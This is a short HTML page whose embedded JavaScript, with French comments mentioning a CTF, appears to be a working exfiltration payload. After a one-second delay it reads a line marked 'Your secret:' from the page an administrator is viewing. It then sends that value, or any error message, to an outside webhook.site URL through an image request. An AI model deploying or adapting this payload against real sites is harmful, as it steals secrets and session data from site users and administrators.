<html>
<script>
// Optionnel : simuler une popup pour le style CTF
var win = window.open("", "_blank"); // ouvre une popup vide

// Fonction pour exfiltrer le secret
function exfiltrate() {
    try {
        // Récupérer le texte de la page courante (admin)
        var secret = document.body.innerText.match(/Your secret:\s*([^\n]+)/)[1];

        // Envoyer au webhook
        new Image().src = "https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=" + encodeURIComponent(secret);
    } catch(e) {
        // Si erreur, envoyer le message d'erreur
        new Image().src = "https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=" + encodeURIComponent(e.message);
    }
}

// Exécuter après un petit délai pour que la page soit chargée
setTimeout(exfiltrate, 1000);
</script>
</html>
